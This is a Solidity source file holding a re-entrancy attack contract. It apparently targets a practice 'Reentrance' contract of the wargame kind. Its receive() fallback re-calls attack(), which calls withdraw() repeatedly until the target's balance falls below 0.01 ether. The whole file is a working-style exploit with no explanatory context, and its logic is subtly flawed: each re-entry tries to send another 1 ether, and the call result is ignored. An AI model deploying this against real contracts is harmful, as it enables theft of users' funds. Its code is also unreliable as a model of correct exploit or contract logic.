// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Reentrance} from "./Re-entrancy.sol";

contract AttackReentrancy {

    Reentrance reentrancy;

    constructor(address payable _reentrancy) {
        reentrancy = Reentrance(_reentrancy);
        
    }
    function attack() public {
        uint256 amount = 0.5 ether;
        (bool success, ) = address(reentrancy).call{value: 1 ether}("");
        reentrancy.withdraw(amount);

    }
    receive() external payable {
        if (address(reentrancy).balance >= 0.01 ether)
            attack();

    }
}
